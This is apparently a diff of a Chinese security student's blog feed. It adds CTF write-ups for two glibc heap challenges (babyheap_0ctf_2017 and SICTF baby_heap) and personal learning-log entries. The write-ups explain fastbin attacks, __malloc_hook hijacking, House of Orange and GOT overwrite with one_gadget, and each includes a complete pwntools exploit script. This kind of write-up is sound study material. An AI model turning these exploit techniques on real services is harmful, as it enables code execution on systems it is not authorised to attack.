@@ -106,6 +106,162 @@
       </tags>
   </entry>
   <entry>
+    <title>BUUCTF babyheap_0ctf_2017</title>
+    <url>/2023/08/14/BUUCTF%20babyheap_0ctf_2017/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+第一道Heap，插个里程碑纪念一下XD
+</blockquote>
+
+<span id="more"></span>
+<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>七月学完栈溢出，ak掉buu前两页的所有栈题<br>八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br>参加了个数据安全的夏令营<br>给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br>给SecretFlow审了一点go语言的洞<br>然后用C#和xaml给sdu校园网写了个一键修复脚本<br>总而言之学的很杂…说实话真不如多打点比赛。<br>本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了…<br>总而言之还是脚踏实地学一点算一点吧<br>还有个南大PA的坑等着我去填呢…才刚把nemu的gdb实现了个单步步入…  </p>
+<hr>
+<h1 id="0x01-babyheap-0ctf-2017"><a href="#0x01-babyheap-0ctf-2017" class="headerlink" title="0x01 babyheap_0ctf_2017"></a>0x01 babyheap_0ctf_2017</h1><blockquote>
+<p>做完这道题才算真正意义上的AK第一页XD</p>
+<h3 id="Ⅰ-主要知识点"><a href="#Ⅰ-主要知识点" class="headerlink" title="Ⅰ. 主要知识点"></a>Ⅰ. 主要知识点</h3><ol>
+<li>堆溢出</li>
+</ol>
+</blockquote>
+<h3 id="Ⅱ-解题步骤"><a href="#Ⅱ-解题步骤" class="headerlink" title="Ⅱ. 解题步骤"></a>Ⅱ. 解题步骤</h3><ol>
+<li><p>checksec 保护全开<br><img src="/pic/Pasted image 20230814133847.png" alt=""></p>
+</li>
+<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br><img src="/pic/Pasted image 20230814134313.png" alt=""><br><img src="/pic/Pasted image 20230814134623.png" alt=""><br>注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p>
+</li>
+<li><p>IDA分析可知，我们可以有以下思路：</p>
+<ol>
+<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
+<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址<ol>
+<li>要泄露libc地址，肯定要读存有libc地址的地址<ol>
+<li>哪里存着libc地址？unsorted bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
+<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
+</ol>
+</li>
+<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure>
+<p>此时堆的情况如下<br><img src="/pic/Pasted image 20230814140742.png" alt=""></p>
+</li>
+<li><p>Free掉index为1和2的chunk，给后面alloc留出空间</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
+<p>heap情况如下<br><img src="/pic/Pasted image 20230814141436.png" alt=""><br>bin情况如下<br><img src="/pic/Pasted image 20230814141724.png" alt=""></p>
+</li>
+<li><p>堆溢出，操控fastbin</p>
+<ol>
+<li>现在是main_arena_fastbin_0x20 —-&gt; chunk2 —-&gt;chunk1</li>
+<li>我们想办法让它变成 xxx_0x20 —-&gt; chunk2 —-&gt;chunk4<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
+（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
+</ol>
+</li>
+<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure>
+<p>heap情况如下<br><img src="/pic/Pasted image 20230814143302.png" alt=""></p>
+</li>
+<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78<br><img src="/pic/Pasted image 20230814144704.png" alt=""></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方<br><img src="/pic/Pasted image 20230814145721.png" alt=""><br>发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br>⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Ⅲ-完整EXP"><a href="#Ⅲ-完整EXP" class="headerlink" title="Ⅲ. 完整EXP"></a>Ⅲ. 完整EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="Ⅳ-一些疑问"><a href="#Ⅳ-一些疑问" class="headerlink" title="Ⅳ. 一些疑问"></a>Ⅳ. 一些疑问</h3><ol>
+<li>__malloc_hook不是在data段中吗？这题开了FULL RELRO为什么可以改啊🤔</li>
+<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
+<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？<ol>
+<li>unsortedbin，后向合并</li>
+</ol>
+</li>
+<li><strong><em>为什么非要在aed处申请堆块？</em></strong><ol>
+<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>WriteUp, Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023SICTF-Pwn-baby_heap-wp</title>
+    <url>/2023/09/22/2023SICTF-Pwn-baby_heap-wp/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+baby一点都不baby...houseoforange+unsortedbinattack
+</blockquote>
+
+<h1 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00  逆向分析"></a>0x00  逆向分析</h1><ol>
+<li>main函数很简单，1申请2编辑3打印，但是没有free，google’no free pwn’了解到有可能是houseoforange</li>
+<li>add函数，两个约束（1. 最多申请32个chunk 2. chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin attack或者unsortedbin attack来打（但这里没有free，就导致fastbin很难利用）<br>![[Pasted image 20230922101040.png]]</li>
+<li>edit函数<br>![[Pasted image 20230922101820.png]]</li>
+<li>show函数，只打印了8个字节就很难受<br>![[Pasted image 20230922101901.png]]</li>
+</ol>
+<h1 id="0x01-思路分析"><a href="#0x01-思路分析" class="headerlink" title="0x01  思路分析"></a>0x01  思路分析</h1><ol>
+<li>我们肯定是要实现“leak libc”和“Any Address Write”<ol>
+<li>leak libc<ol>
+<li>思路1：unsortedbin leak<ol>
+<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
+</ol>
+</li>
+<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
+</ol>
+</li>
+<li>Any Address Write<ol>
+<li>思路1：常规unsortedbin attack<ol>
+<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
+</ol>
+</li>
+<li>思路2：unsortedbin 申请 fake_chunk<ol>
+<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>将写入的got表改写为og即可提权</li>
+</ol>
+<h1 id="0x02-具体步骤"><a href="#0x02-具体步骤" class="headerlink" title="0x02  具体步骤"></a>0x02  具体步骤</h1><ol>
+<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br></pre></td></tr></table></figure></li>
+<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
+<li>伪造victim.bk = 0x4040c8（fake_chunk_head）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
+<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
+<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="0x03-一些问题"><a href="#0x03-一些问题" class="headerlink" title="0x03  一些问题"></a>0x03  一些问题</h1><p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br>Q2： 我感觉申请8个chunk就够了…把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
+<h1 id="0x04-完整EXP"><a href="#0x04-完整EXP" class="headerlink" title="0x04  完整EXP"></a>0x04  完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+        <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HeapLearningLog1</title>
     <url>/2023/08/24/HeapLearningLog1/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
@@ -183,8 +339,11 @@
 </ul>
 </li>
 </ul>
-<p>还有一点，做Heap题不像Stack一样可以整体分析完以后，用排除法来决定用什么打法，而应该是边打边分析我碰到了什么敏感函数。<br>大失败..做不下去，把一道题的思路分析好了就因为觉得自己差不多能做出来了就不想做了，kuso。</p>
-<h2 id="2023-08-29"><a href="#2023-08-29" class="headerlink" title="2023/08/29"></a>2023/08/29</h2>]]></content>
+<p>还有一点，做Heap题不像Stack一样可以整体分析完以后，用排除法来决定用什么打法，而应该是边打边分析我碰到了什么敏感函数。<br>大失败..做不下去，把一道题的思路分析好了就因为觉得自己差不多能做出来了就不想做了，kuso。<br>杀了个回马枪，23:00决定还是今天要做出一道题来，于是打开buu第三页准备做一道。<br>1h，完全做不出来（<br>roar这道题是off_by_one + fastbin attack就好了，最后劫持malloc_hook为og不太行，网上说要用realloc调整栈环境，但调整以后也不行…<br>先sleep吧，明天再战。    </p>
+<h2 id="2023-08-31"><a href="#2023-08-31" class="headerlink" title="2023/08/31"></a>2023/08/31</h2><p>突然发现两天没写log了。<br>29号忘了干了啥了，30号返校，下午收拾了一下然后给新生赛出题。<br>今天上午把moe的pwnak掉，下午练吉他打球，晚上复盘并整合一下IOfile。<br>奥对，今天过了NaN的审核，以后咱也是联合战队的一员啦XD<br>不过…N1师傅们确实太牛了，我想被录到N1现在还是天方夜谭…<br>现在是幻想时间：<br>九月份第一个周通关Heap，第二个周复现一些奇奇怪怪的题比如WM的jit，第三周缓冲，第四周接触Kernal.<br>针不戳，看看我有没有能力实现吧…去复盘IOFILE了.  </p>
+<h2 id="2023-09-04"><a href="#2023-09-04" class="headerlink" title="2023/09/04"></a>2023/09/04</h2><p>又好久没记录log…返校以后太忙了，第一个周各种文件各种学生工作，零碎时间都被占用了。<br>第一周通关Heap的梦想破灭了…  </p>
+<h2 id="2023-09-20"><a href="#2023-09-20" class="headerlink" title="2023/09/20"></a>2023/09/20</h2><p>居然九月二十了，这也太快了。<br>今天大致看了一下kernal pwn的CVE-2022-0995，对kernal pwn的环境搭建有了一点印象，但里面的大部分内容我都看不懂😭不过里面提到的堆喷让我想起了蓝帽杯初赛的heapSpray我还没复现。<br>然后复现了一下heapSpray，整个程序逆向起来贼头疼，以后要是逆起来很麻烦就patch，一边调一边猜一边逆，不过最后没复现出来，只是大概对堆喷有了一个基本的认知。<br>然后又去wiki上看一下接下来要学堆的哪一部分，结果发现自己哪一部分都有纰漏…主要原因还是对ptmalloc的一些机制不够熟悉，比如unsortedbin什么时候前向合并，比如unlink的时候检查的是fd和bk的什么等等。<br>正好想到之前看的winmt也写过heap和io的笔记，那我也来模仿一下吧。<br>之前太膨胀了，给自己定了好多不切实际的目标。<br>这个月剩下的十天，每天的pwn时间肯定还是要打一道题的，如果有多余的时间就来整理一下堆的管理机制。  </p>
+]]></content>
       <categories>
         <category>LearningLog</category>
       </categories>
@@ -193,104 +352,18 @@
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF babyheap_0ctf_2017</title>
-    <url>/2023/08/14/BUUCTF%20babyheap_0ctf_2017/</url>
+    <title>异世界见闻录(1)</title>
+    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
-第一道Heap，插个里程碑纪念一下XD
+我不想沉在无人问津的海底，只好把登顶作为我的理想
 </blockquote>
 
 <span id="more"></span>
-<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>七月学完栈溢出，ak掉buu前两页的所有栈题<br>八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br>参加了个数据安全的夏令营<br>给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br>给SecretFlow审了一点go语言的洞<br>然后用C#和xaml给sdu校园网写了个一键修复脚本<br>总而言之学的很杂…说实话真不如多打点比赛。<br>本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了…<br>总而言之还是脚踏实地学一点算一点吧<br>还有个南大PA的坑等着我去填呢…才刚把nemu的gdb实现了个单步步入…  </p>
-<hr>
-<h1 id="0x01-babyheap-0ctf-2017"><a href="#0x01-babyheap-0ctf-2017" class="headerlink" title="0x01 babyheap_0ctf_2017"></a>0x01 babyheap_0ctf_2017</h1><blockquote>
-<p>做完这道题才算真正意义上的AK第一页XD</p>
-<h3 id="Ⅰ-主要知识点"><a href="#Ⅰ-主要知识点" class="headerlink" title="Ⅰ. 主要知识点"></a>Ⅰ. 主要知识点</h3><ol>
-<li>堆溢出</li>
-</ol>
-</blockquote>
-<h3 id="Ⅱ-解题步骤"><a href="#Ⅱ-解题步骤" class="headerlink" title="Ⅱ. 解题步骤"></a>Ⅱ. 解题步骤</h3><ol>
-<li><p>checksec 保护全开<br><img src="/pic/Pasted image 20230814133847.png" alt=""></p>
-</li>
-<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br><img src="/pic/Pasted image 20230814134313.png" alt=""><br><img src="/pic/Pasted image 20230814134623.png" alt=""><br>注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p>
-</li>
-<li><p>IDA分析可知，我们可以有以下思路：</p>
-<ol>
-<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
-<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址<ol>
-<li>要泄露libc地址，肯定要读存有libc地址的地址<ol>
-<li>哪里存着libc地址？unsorted bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
-<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
-</ol>
-</li>
-<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：</p>
